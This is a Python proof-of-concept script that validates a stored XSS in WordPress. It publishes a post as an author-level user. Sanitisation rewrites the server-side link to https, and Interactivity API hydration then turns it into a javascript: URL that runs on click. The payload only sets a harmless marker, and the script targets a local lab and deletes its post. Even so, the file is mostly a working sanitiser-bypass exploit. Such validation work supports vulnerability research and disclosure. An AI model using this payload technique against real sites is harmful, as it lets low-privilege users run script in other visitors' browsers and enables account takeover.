#!/usr/bin/env python3
"""Minimal validation: server writes `https://`, the browser executes `javascript:`.

LAB ONLY. Target defaults to http://127.0.0.1:18080 (a WordPress you started).
The post is deleted at the end unless `--keep` is passed.

    python3 validate_xss.py [--keep]
"""
from __future__ import annotations

import argparse
import re
import sys
import time

import requests
from playwright.sync_api import sync_playwright

import wp_lab


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--keep", action="store_true", help="leave the lab post in place")
    args = parser.parse_args()

    c = wp_lab.cfg()
    print(f"[*] target: {c.base}   (LAB ONLY)")

    author = wp_lab.login_author()
    if not author.nonce:
        print("FAIL: could not log in / scrape a REST nonce")
        return 1
    print(
        f"[*] acting as: {author.display or author.name}  "
        f"uid={author.uid}  roles={author.roles}"
    )

    payload = (
        '<div id="isl" data-wp-interactive="pwn" '
        'data-wp-context="{&quot;u&quot;:&quot;javascript:window.__XSS=1;void 0&quot;}">'
        '<a id="t" href="https://example.com/" data-wp-bind--href="context.u">CAP</a></div>'
    )
    post, status = wp_lab.publish(
        author, f"simple-poc-{int(time.time())}", wp_lab.accordion(payload)
    )
    post_id = post["id"]
    print(
        f"[*] post created: #{post_id}  http={status}  "
        f"status={post.get('status')}  author={post.get('author')}"
    )

    # 1) Server render: the static href was sanitised by kses.
    page = requests.get(f"{c.base}/?p={post_id}", timeout=30).text
    # Require whitespace before href= so we do not match data-wp-bind--href.
    match = re.search(r'<a id="t"[^>]*?\shref="([^"]*)"', page)
    observation = {"post": post_id, "server_href": match.group(1) if match else None}

    # 2) Client render: hydration rewrites the live href from data-wp-context.
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(
            executable_path=c.chrome, headless=True, args=["--no-sandbox"]
        )
        page = browser.new_context().new_page()
        page.goto(f"{c.base}/?p={post_id}", wait_until="load")
        page.wait_for_timeout(1500)
        observation["hydrated_href"] = page.evaluate(
            "() => {const t=document.querySelector('#t');"
            " return t ? t.getAttribute('href') : null}"
        )
        # 3) Click: the javascript: URL executes in the page origin.
        page.evaluate("() => {const t=document.querySelector('#t'); if (t) t.click()}")
        deadline = time.time() + 10
        while time.time() < deadline:
            if page.evaluate("() => window.__XSS"):
                break
            page.wait_for_timeout(250)
        observation["click_marker"] = page.evaluate("() => window.__XSS || null")
        browser.close()

    if not args.keep:
        admin = wp_lab.login_admin()
        observation["cleaned_up"] = wp_lab.delete_post(admin, post_id)
    else:
        observation["cleaned_up"] = False
        observation["kept_post"] = post_id

    wp_lab.write_json("poc_simple_validation.json", observation)

    print(f"[*] server  href (kses, pre-hydration): {observation['server_href']!r}")
    print(f"[*] client  href (post-hydration):      {observation['hydrated_href']!r}")
    print(f"[*] click marker executed:               {observation['click_marker']!r}")

    ok = (
        (observation["server_href"] or "").startswith("https://")
        and "javascript:" in (observation["hydrated_href"] or "")
        and observation["click_marker"] == 1
    )
    print(
        "\n"
        + (
            "PASS — stored XSS validated: server says https, browser executes javascript:"
            if ok
            else "FAIL — see observations"
        )
    )
    return 0 if ok else 2


if __name__ == "__main__":
    sys.exit(main())
